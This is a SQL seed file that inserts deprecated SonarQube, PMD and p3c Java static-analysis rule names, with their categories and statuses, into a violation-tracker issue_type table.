INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7e4a804f-060e-4adb-bad6-c63139728db3', 'Avoid Array Loops', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7e5c8bd3-db5f-4597-a49a-1e79a2780719', 'Clone Method Must Implement Cloneable (With Type Resolution)', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7e696988-f011-4753-8eed-c6c09fb804c6', 'Avoid Using Hard Coded IP', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7eed4919-d2f9-46f4-b951-2954518d21a0', '"switch" statements should not be nested', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('7f42f4f5-8b0c-4191-aa8e-c5df409433e9', 'Avoid Thread Group', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8007aac0-3c9d-4aa4-a818-7ab4cbd1f417', 'Empty Static Initializer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('808f1727-b11f-40aa-a0ae-118734177655', 'Naming - Variable naming conventions', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('827e7bbc-30c0-490f-913e-da2da6464a51', '[p3c]When using subList, be careful to modify the size of original list.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('84af605f-8920-4b9a-97d9-77bf740e3172', 'Position Literals First In Case Insensitive Comparisons', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('857926a0-2402-484a-babb-ef2c92820bad', 'LDAP deserialization should be disabled', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8819b2ab-03c5-471d-a4ce-2b0b43df2d1a', 'Simplify Conditional', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8888a12a-570d-4844-bee7-bb02c33d2caa', 'Default label not last in switch statement', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('88f27b21-6a2f-4c4b-a55b-013c58685ec9', 'String Buffer Instantiation With Char', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('893bab51-f46b-4cd0-9022-a376c93a75d1', 'Excessive Class Length', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('897d1aa3-2394-4cbb-ae8f-b2fa11ddf8cc', 'Avoid Duplicate Literals', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('89c13b1b-b536-4213-8f43-b18e8e8760be', 'JUnit static suite', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8b4dceb5-aa84-4905-9acd-76444975a7cb', 'Skipped unit tests should be either removed or fixed', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8cafb2ca-6dfb-442f-a68b-89507a4ea76b', 'Simplify boolean assertion', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8d04471e-18de-4c87-894a-27b58406d664', 'Unnecessary Final Modifier', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8d44716e-9303-44c7-8276-f7e50f2942af', 'Static EJB Field Should Be Final', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('8d9d6e86-c4c2-473c-b878-2df07d2532f1', 'Locale should be used in String operations', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('915121d8-f40c-4106-a180-2efa425bfce5', 'JUnit4 Suites Should Use Suite Annotation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('93ef3eea-846e-4d77-98bb-c5f8c2c54437', 'No package', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9598ce00-f829-436a-9e23-d7b1b633d938', 'Unnecessary Fully Qualified Name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9610f0ac-0520-4c6c-94a4-2b856778c1f2', 'Class Cast Exception With To Array', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9670a50d-6034-45ea-98d2-34fa90cea555', '[p3c]Manually create thread pool is better.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('968be856-4ed9-4b11-8f91-aab09e49f82b', '[p3c]Do not remove or add elements to a collection in a foreach loop.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('96a5f195-e1f9-4c8e-988a-1390421a81e0', 'If Stmts Must Use Braces', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('96cc6ca7-7278-4beb-8d57-b402d201cbe2', 'Import From Same Package', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('97bee36b-6819-4bda-8c95-a5486851f752', 'Unused Modifier', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9859f3d9-9f4a-478a-8c2d-5485883f9795', 'Only one getInstance method is allowed', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('99273c33-be79-4adb-a95d-d55938625e0e', 'Java5 migration - Short instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9985e198-d0b0-47a2-9728-60fdc684dfec', 'JUnit4 Test Should Use After Annotation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('99ea3add-cb0e-4ffd-8202-a829e71aa5b2', 'Use assertNull instead of assertTrue', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9afe3388-c467-402b-a14c-ec7f122a972c', 'Use String Buffer For String Appends', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9b333545-3f6b-4bde-a33b-b5d2d8cd6114', 'Return empty array rather than null', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9b8fe5c6-a5ec-4e6c-8c4d-8c210268c5b7', 'Short Variable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9bba9c41-36ae-43f7-8770-cd2678a54628', 'Proper Logger', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9bd89b71-c5ac-4136-90ff-0259f2ad2690', 'JUnit4 Test Should Use Before Annotation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9c40c526-702b-401a-a676-c2063aeb61c9', '[p3c]Single line comments in a method should be put above the code to be commented, by using // and multiple lines by using /* */.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9e5b5980-db1c-4af5-87d0-ed8fa731ba39', 'Excessive Parameter List', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9e9225d3-7cc5-4e9d-8654-5b2b1e7747c4', 'Position Literals First In Comparisons', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9f299a9c-721e-4ae5-9d00-7a1c7e0d2232', 'Std Cyclomatic Complexity', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('9ff0a2f6-bc75-4091-8165-db60cd415682', 'Code size - cyclomatic complexity', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a0186922-e9c5-410f-a894-c4ff9365c93a', 'Avoid Catching Generic Exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a01d883b-34dc-4348-9b2c-af75df9ac88a', 'Basic - Empty Initializer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a022e5a2-97c1-4194-b727-1d439840f23e', '[p3c]Do not add ''is'' as prefix while defining Boolean variable.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a04e2a56-f05e-43db-891e-ef823c6c4220', 'Confusing Ternary', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a15cbf02-d945-4ea1-a0bf-b645d49d0807', 'Coupling - excessive imports', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a2cbf7ca-ae0f-4728-a2f3-a7af186d8fea', 'Check ResultSet', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('a3669bd0-99fd-4a69-9bb4-7512e004b326', 'Integer Instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('aae15e03-7185-4293-8557-13a2ce74ba0a', 'Add Empty String', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ab55d42a-c681-46c0-b323-c3c7689fc000', 'Bean Members Should Serialize', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('abdfec72-3436-4f54-a60a-da27a8bd5ba4', 'Avoid Enum As Identifier', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ac1ad108-793c-45ad-b7e2-9f89e179b81e', 'Avoid Accessibility Alteration', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('acc03392-4ca8-42b7-bd4b-41ae4f748c30', 'Useless String Value Of', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('acc2ffc2-84ed-4983-8320-fe5e77ca936b', '[p3c]HashMap should set a size when initializing.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ad648a0c-16d8-4739-b996-a731d05283ad', '"private" methods that don''t access instance data should be "static"', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('af5c608f-3643-4fd8-9bf8-34f44b250cbc', 'System Println', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('afb63c33-7e4e-4686-9f4d-710f90fa1b49', 'By convention, classes that implement the Cloneable interface should override Object.clone (which is protected) with a public method', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b00a5f27-ed63-45ee-9c7c-969824b891e8', 'Android - call super last', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b049b9df-4142-4fe4-9b3b-a363cf45f3a3', 'Avoid Assert As Identifier', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b060e609-d885-445f-b90b-c63eb63a49ca', 'Empty Finally Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b080e7f6-3bc6-483d-90df-f547e0aa9c9b', 'Missing Serial Version UID', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b117260a-3379-406d-863b-48c78333ec2b', 'Avoid Catching NPE', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b241ea4b-bfaa-45d8-a4f5-5cb72521ae82', 'Guard Debug Logging', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b2b9cbb3-52b6-430e-b03c-bd4f49198d67', 'Dont Import Sun', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b3a4251b-d596-48ea-a5b7-31e6d1f88ad7', 'Excessive Method Length', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b3e44e00-4a64-41c4-8065-d5e32ac4d07f', 'Do not call garbage collection explicitly', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b4596fe1-862f-4d3f-82f6-794844223e31', 'Idempotent Operations', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b499a643-dc2a-49ec-9c73-b316e0523d9e', 'Clone method must implement Cloneable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b4b71510-37ff-4eaf-a326-a7e043cd344d', 'Premature Declaration', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b67d4777-bc9f-4396-ab45-29681a7be0d9', 'For Loop Should Be While Loop', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b6a70640-885a-4e37-9481-af63aeb60e10', 'Switch Density', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b6e8a439-61c5-4e30-9619-87778212e4d5', 'Empty Switch Statements', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b78679cb-d58c-4524-82f3-2f68c6f32762', 'Inefficient String Buffering', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b7da5f71-2a09-437c-87d5-ed56c801c3c4', 'Do Not Extend Java Lang Error', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b8537695-d3b5-4e2b-81d3-d25aa3040858', '[p3c]Test cases should be ended with Test.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b8572f19-1194-4f26-bde1-1e7b9a22f0f8', '[p3c]The total number of lines for a method should not be more than 80.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b9a0e7a9-47df-4d18-8ca4-ebf3a44a7166', 'Branches should have sufficient coverage by tests', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b9d8a19a-d48b-450e-b3ea-0220ebe40d61', 'Avoid Using Native Code', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('b9ed93ba-0380-41b3-9073-47b4cdb8ab6a', 'Boolean Get Method Name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bb04a38c-82f7-4688-b3e8-222f833d92a1', 'Use Assert True Instead Of Assert Equals', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bcfb8a0c-5c48-46b8-aee7-7aa6ee79b4d2', 'Missing Break In Switch', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bd03174f-58ba-4665-9365-d8af5274b76d', 'Empty Synchronized Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('be8a437b-9569-4331-9f1a-4da7cf12161f', 'Misplaced Null Check', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bece5725-18f2-459d-bf1d-42a022f2c416', 'Naming - Suspicious Hashcode method name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bf657bac-d9cd-402b-808f-64fccee9e217', 'Extends Object', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('bfc3c6e2-f816-4296-b5fe-011d1d644f4e', 'Java5 migration - Byte instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c1931d68-0a2c-4249-a97b-b9f05175cb40', 'Hashing data is security-sensitive', 'sonarqube', 'SECURITY_HOTSPOT', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c22284ff-bbf1-4bc4-af62-8d81848d4a06', 'Track uses of disallowed classes', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c2856fb3-4f8c-46f9-86c5-eb2833512026', 'Source files should not have any duplicated blocks', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c29211bd-a297-4d7c-a0a5-3ca93ec68a55', 'Collapsible If Statements', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c2a9adb8-3858-4d30-9a83-1f265027c92b', 'Empty Try Block', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c3d2ec35-0dc2-41d7-96e2-5ec29a450356', 'Non Case Label In Switch Statement', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c3fcad29-dffb-4b48-9ecc-47444aefef2f', 'Strict Exception - Avoid throwing new instance of same exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c4321c8d-e1b6-47b7-a454-7d6c2811479b', 'Message Driven Bean And Session Bean Naming Convention', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c44a791f-2c97-4cb5-b991-8911b959dde1', '[p3c]If the return type is primitive, return a value of wrapper class may cause NullPointerException.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c4819437-ff03-4e25-a4d1-470eec5e65ba', '[p3c]Every class should include information of author(s) and date.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c4c34374-5b1f-41b2-b542-508990b0c727', 'Source files should have a sufficient density of comment lines', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c511f83a-8882-4d1b-9070-1a188295b319', '[p3c]The return type of Math.random() is double, value range is 0<=x<1 (0 is possible).', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c557f7ff-7b7b-4b51-a89b-c79578a1861c', 'Avoid instantiating objects in loops', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c63c7727-1775-43f4-a770-a4035dcb981b', 'Only One Return', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c7a1279f-cbc7-4839-9463-796b2bb4d4d4', '[p3c]A meaningful thread name is helpful to trace the error information,so assign a name when creating threads or thread pools.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('c7ed097a-d7df-4810-98e4-0691b5cff143', 'Avoid Protected Field In Final Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ca0b78e2-f397-47f0-87da-5e627fef05f4', 'Use Utility Class', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ca6a2095-4928-40b5-b58f-b0e4aafae714', 'Remote Interface Naming Convention', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('ca6a88d8-f2af-459b-bafa-d2414368a75e', 'Track uses of disallowed dependencies', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
